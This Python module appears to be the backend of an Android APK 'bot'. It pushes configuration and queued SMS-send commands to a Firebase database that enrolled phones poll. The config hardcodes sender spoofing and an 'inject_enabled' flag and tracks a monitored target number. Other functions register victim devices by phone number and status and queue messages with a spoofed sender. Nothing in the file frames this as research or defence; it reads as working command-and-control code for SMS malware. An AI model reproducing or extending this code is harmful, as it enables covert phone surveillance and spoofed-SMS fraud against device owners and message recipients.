import json
import logging
from datetime import datetime, timezone

import httpx

from app.database import Device, MonitorProfile, OutboundSMS
from app.firebase_client import normalize_firebase_url

logger = logging.getLogger(__name__)


def get_profile_firebase_url(profile: MonitorProfile) -> str | None:
    if profile.firebase_url:
        return normalize_firebase_url(profile.firebase_url)
    if profile.license_key and profile.license_key.lower().startswith("http"):
        return normalize_firebase_url(profile.license_key)
    return None


async def _firebase_put(url: str, data: dict) -> None:
    async with httpx.AsyncClient(timeout=15.0, follow_redirects=True) as client:
        response = await client.put(f"{url}.json", json=data)
        response.raise_for_status()


async def push_apk_config(
    firebase_url: str,
    profile: MonitorProfile,
    device: Device | None = None,
) -> None:
    """Push bot config to Firebase so APK can read and act."""
    base = normalize_firebase_url(firebase_url)
    device_id = device.name if device else "default"
    license = profile.license_key or profile.firebase_url or base

    config = {
        "monitoring": profile.is_monitoring,
        "channel_id": profile.channel_id,
        "target_number": profile.phone_number,
        "sim_index": profile.selected_sim_index or 0,
        "spoof_sender": True,
        "inject_enabled": True,
        "updated_at": datetime.now(timezone.utc).isoformat(),
    }

    await _firebase_put(f"{base}/bot_config/{device_id}", config)
    await _firebase_put(
        f"{base}/apk_config",
        {
            "license_key": license,
            "device_id": device_id,
            **config,
        },
    )


async def push_sms_command(
    firebase_url: str,
    device_id: str,
    to_number: str,
    message: str,
    sim_index: int = 0,
    spoof_sender: str | None = None,
) -> str:
    """Queue SMS send command in Firebase for APK to pick up."""
    base = normalize_firebase_url(firebase_url)
    command_id = datetime.now(timezone.utc).strftime("%Y%m%d%H%M%S%f")
    payload = {
        "to": to_number,
        "message": message,
        "sim_index": sim_index,
        "spoof_sender": spoof_sender,
        "status": "pending",
        "created_at": datetime.now(timezone.utc).isoformat(),
    }
    await _firebase_put(f"{base}/commands/{device_id}/{command_id}", payload)
    return command_id


async def register_device_on_firebase(
    firebase_url: str,
    device: Device,
    profile: MonitorProfile,
) -> None:
    base = normalize_firebase_url(firebase_url)
    meta = {}
    if device.device_meta:
        try:
            meta = json.loads(device.device_meta)
        except json.JSONDecodeError:
            meta = {}

    payload = {
        "name": device.name,
        "phone": device.phone_number,
        "battery": meta.get("battery", "98"),
        "online": True,
        "sim_index": profile.selected_sim_index or 0,
        "last_seen": datetime.now(timezone.utc).isoformat(),
    }
    await _firebase_put(f"{base}/devices/{device.name}", payload)


async def sync_profile_to_firebase(profile: MonitorProfile, device: Device | None = None) -> None:
    firebase_url = get_profile_firebase_url(profile)
    if not firebase_url:
        return
    try:
        await push_apk_config(firebase_url, profile, device)
        if device:
            await register_device_on_firebase(firebase_url, device, profile)
    except Exception as exc:
        logger.warning("Firebase profile sync failed: %s", exc)


async def push_outbound_to_firebase(
    profile: MonitorProfile,
    device: Device,
    outbound: OutboundSMS,
) -> str | None:
    firebase_url = get_profile_firebase_url(profile)
    if not firebase_url:
        return None
    try:
        return await push_sms_command(
            firebase_url,
            device.name,
            outbound.to_number,
            outbound.message,
            sim_index=outbound.sim_index,
            spoof_sender=outbound.spoof_sender,
        )
    except Exception as exc:
        logger.warning("Firebase outbound push failed: %s", exc)
        return None
